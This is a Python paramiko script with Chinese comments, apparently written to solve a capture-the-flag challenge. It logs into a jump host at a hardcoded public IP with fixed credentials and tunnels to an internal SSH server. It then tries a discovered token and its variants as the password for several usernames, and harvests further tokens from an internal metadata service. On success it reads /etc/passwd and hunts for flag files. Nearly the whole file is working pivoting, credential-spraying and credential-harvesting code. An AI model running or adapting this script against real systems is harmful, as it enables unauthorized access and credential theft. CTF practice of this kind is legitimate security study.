import paramiko
import socket
import time
import sys

"""
发现Token！
token: RwkgqPR473FQQ25Lc3sCgVG1sM6iTm2G42i8oZHu

让我尝试用这个token作为：
1. SSH密码
2. Rancher API认证
3. 其他用途
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

TOKEN = "RwkgqPR473FQQ25Lc3sCgVG1sM6iTm2G42i8oZHu"

def try_token_as_ssh_password():
    """尝试使用token作为SSH密码登录172.17.0.1"""
    print("[*] 尝试使用token作为SSH密码")
    
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    # 测试不同用户名 + token作为密码
    usernames = ["ctf", "root", "ubuntu", "admin", "flag", "user", "rancher"]
    
    for username in usernames:
        try:
            # 创建隧道
            tunnel = jumphost_transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=5)
            
            # 创建SSH连接
            target_transport = paramiko.Transport(tunnel)
            target_transport.start_client(timeout=10)
            
            try:
                target_transport.auth_password(username, TOKEN)
                print(f"[+] 成功! 用户: {username}, 密码: {TOKEN}")
                
                # 执行命令获取flag
                channel = target_transport.open_session()
                channel.exec_command("id; whoami; cat /etc/passwd | head -5")
                time.sleep(2)
                
                output = b""
                while channel.recv_ready():
                    output += channel.recv(4096)
                print(f"输出:\n{output.decode()}")
                
                # 尝试获取flag
                channel2 = target_transport.open_session()
                channel2.exec_command("sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1; cat /mnt/flag 2>&1; ls -la /mnt/ 2>&1")
                time.sleep(2)
                
                output2 = b""
                while channel2.recv_ready():
                    output2 += channel2.recv(4096)
                print(f"Flag尝试:\n{output2.decode()}")
                
                channel.close()
                channel2.close()
                target_transport.close()
                tunnel.close()
                jumphost.close()
                return True
                
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                if "Authentication" not in str(e):
                    print(f"  {username}: 错误 - {e}")
            
            target_transport.close()
            tunnel.close()
            
        except Exception as e:
            pass
    
    jumphost.close()
    return False

def try_token_variants():
    """尝试token的变体"""
    print("\n[*] 尝试token变体作为密码")
    
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    # Token的变体
    tokens = [
        TOKEN,
        TOKEN.lower(),
        TOKEN.upper(),
        TOKEN[:20],
        TOKEN[:10],
        f"token:{TOKEN}",
        f"bearer {TOKEN}",
    ]
    
    for token in tokens:
        try:
            tunnel = jumphost_transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=5)
            target_transport = paramiko.Transport(tunnel)
            target_transport.start_client(timeout=10)
            
            try:
                target_transport.auth_password("root", token)
                print(f"[+] 成功! 密码: {token}")
                
                target_transport.close()
                tunnel.close()
                jumphost.close()
                return True
                
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                pass
            
            target_transport.close()
            tunnel.close()
            
        except Exception as e:
            pass
    
    jumphost.close()
    return False

def http_get(transport, host, port, path):
    """发送HTTP GET请求"""
    try:
        channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
        channel.settimeout(5)
        
        request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
        channel.send(request.encode())
        
        time.sleep(0.5)
        response = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                response += chunk
            except:
                break
        
        channel.close()
        
        response_text = response.decode()
        if "\r\n\r\n" in response_text:
            body = response_text.split("\r\n\r\n", 1)[1]
            return body
        return response_text
    except Exception as e:
        return f"Error: {e}"

def explore_more_metadata():
    """探索更多元数据"""
    print("\n[*] 探索更多元数据以找到凭据")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 查找所有服务的token
    services_list = http_get(transport, "172.17.0.2", 80, "/latest/services/")
    
    if "Error" not in services_list:
        lines = services_list.strip().split("\n")
        
        tokens_found = []
        
        for line in lines:
            parts = line.split("=")
            if len(parts) == 2:
                index = parts[0]
                name = parts[1]
                
                # 获取token
                token_result = http_get(transport, "172.17.0.2", 80, f"/latest/services/{index}/token")
                if token_result and "Error" not in token_result and "Not found" not in token_result:
                    token_clean = token_result.strip()
                    if token_clean:
                        tokens_found.append((name, token_clean))
        
        print(f"找到 {len(tokens_found)} 个token:")
        for name, token in set(tokens_found):  # 去重
            print(f"  {name}: {token}")
    
    ssh.close()

def try_all_found_tokens():
    """尝试所有找到的token"""
    print("\n[*] 尝试所有找到的token")
    
    # 已知的token
    tokens = [
        "RwkgqPR473FQQ25Lc3sCgVG1sM6iTm2G42i8oZHu",
    ]
    
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    # 首先收集更多token
    services_list = http_get(jumphost_transport, "172.17.0.2", 80, "/latest/services/")
    
    if "Error" not in services_list:
        lines = services_list.strip().split("\n")
        
        for line in lines:
            parts = line.split("=")
            if len(parts) == 2:
                index = parts[0]
                
                token_result = http_get(jumphost_transport, "172.17.0.2", 80, f"/latest/services/{index}/token")
                if token_result and "Error" not in token_result and "Not found" not in token_result:
                    token_clean = token_result.strip()
                    if token_clean and token_clean not in tokens:
                        tokens.append(token_clean)
    
    print(f"找到 {len(tokens)} 个唯一token")
    
    # 尝试每个token
    for token in tokens:
        for username in ["root", "ubuntu", "ctf", "admin"]:
            try:
                tunnel = jumphost_transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=3)
                target_transport = paramiko.Transport(tunnel)
                target_transport.start_client(timeout=5)
                
                try:
                    target_transport.auth_password(username, token)
                    print(f"\n[+] 成功! 用户: {username}, Token: {token}")
                    
                    # 获取shell
                    channel = target_transport.open_session()
                    channel.exec_command("id; ls -la /; cat /flag* 2>/dev/null")
                    time.sleep(2)
                    
                    output = b""
                    while channel.recv_ready():
                        output += channel.recv(4096)
                    print(f"输出:\n{output.decode()}")
                    
                    channel.close()
                    target_transport.close()
                    tunnel.close()
                    jumphost.close()
                    return
                    
                except paramiko.AuthenticationException:
                    pass
                except Exception as e:
                    pass
                
                target_transport.close()
                tunnel.close()
                
            except Exception as e:
                pass
    
    print("没有token认证成功")
    jumphost.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 使用Token尝试认证")
    print("="*60)
    
    if not try_token_as_ssh_password():
        try_token_variants()
    
    print("\n" + "="*60)
    explore_more_metadata()
    
    print("\n" + "="*60)
    try_all_found_tokens()
